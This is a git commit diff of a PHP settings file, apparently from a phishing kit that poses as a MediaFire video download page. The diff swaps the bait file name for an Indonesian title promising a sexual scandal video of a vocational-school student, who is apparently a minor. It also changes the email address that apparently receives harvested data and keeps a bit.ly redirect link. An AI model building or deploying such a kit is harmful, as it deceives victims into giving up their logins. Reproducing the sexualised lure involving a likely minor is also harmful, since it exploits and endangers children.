ba72017aa3743c126eeed444e22f3d1f0dfe0088
Sarkembel <118401674+Sarkembel@users.noreply.github.com>
2023-06-26 16:26:14 +0700

    Update email.php

--- email.php
+++ email.php
@@ -3,10 +3,10 @@
 // WE love Nextnesia
 $linkweb = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
 $link = 'https://bit.ly/MediaFIRE'; //link tujuan jika sesudah di klik
-$namafile = 'Video Ngen Mulus+Pink Banget.Mp4'; //Ganti Judul
-$ukuranfile = '34,6MB'; //KB MB GB TB
+$namafile = 'Video skandal Siswa Smk Buka Perawan.Mp4'; //Ganti Judul
+$ukuranfile = '56,6MB'; //KB MB GB TB
 
-$emailku = 'yogatebar7@gmail.com'; // email kamu
+$emailku = 'sonhaji2987@gmail.com'; // email kamu
 
 
 
